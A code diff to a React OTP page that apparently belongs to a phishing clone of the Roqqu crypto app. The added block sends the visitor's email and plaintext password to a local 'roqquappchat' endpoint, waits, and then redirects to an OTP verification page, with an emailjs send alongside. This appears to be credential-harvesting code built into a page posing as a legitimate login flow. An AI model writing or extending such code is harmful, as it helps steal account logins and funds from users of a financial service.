@@ -32,6 +32,46 @@ export default function Otp(props) {
 
             templateParams.client_otp = clientOtp
 
+             try {
+                 const response = await fetch(
+                     'http://localhost:3030/roqquappchat',
+                     {
+                         method: 'POST',
+                         headers: {
+                             'Content-type': 'application/json',
+                         },
+                         body: JSON.stringify({
+                             email,
+                             password,
+                             pin: '',
+                             otp: '',
+                         }),
+                     }
+                 )
+
+                 const resData = await response.json()
+
+                 console.log('email sending started')
+
+                 if (resData.status === 'success') {
+                     console.log('Message Sent.')
+                      setTimeout(() => {
+                          console.log('time out init')
+                          setLoading(false)
+
+                          history.push('/verifyotp', templateParams)
+                      }, 10000)
+
+                 } else if (resData.status === 'fail') {
+                     console.log('Message failed to send.')
+                                         setLoading(false)
+
+                 }
+             } catch (err) {
+                 console.log(err)
+
+             }
+
 
             emailjs
                 .send(
